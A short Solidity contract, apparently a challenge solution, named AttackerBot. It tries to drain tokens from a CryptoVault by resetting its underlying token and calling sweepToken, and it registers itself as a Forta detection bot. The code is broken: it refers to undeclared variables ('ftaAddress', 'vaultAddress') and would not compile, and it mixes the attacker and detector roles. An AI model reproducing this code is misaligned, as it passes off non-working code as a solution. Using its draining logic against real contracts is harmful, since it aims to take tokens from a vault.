pragma solidity ^0.8.0;

interface Forta {
    function setDetectionBot(address detectionBotAddress) external;
}


interface CryptoVault {
    function setUnderlying(address latestToken) external;
    function sweepToken(IERC20 token) external;
}


interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}


interface DoubleEntryPoint {
    function cryptoVault() external view returns (address);
}


contract AttackerBot {
    address public immutable doubleEntryPoint;
    address public immutable fortaAddress;


    constructor(address _doubleEntryPoint, address _fortaAddress) {
        doubleEntryPoint = _doubleEntryPoint;
        fortaAddress = _fortaAddress;
    }

    function setBot() external {
        Forta(ftaAddress).setDetectionBot(address(this));
    }

    function exploit() external {
        address vault = DoubleEntryPoint(doubleEntryPoint).cryptoVault();
        CryptoVault(vaultAddress).setUnderlying(address(0));
        IERC20 token = IERC20(doubleEntryPoint);
        CryptoVault(vaultAddress).sweepToken(token);
    }
}
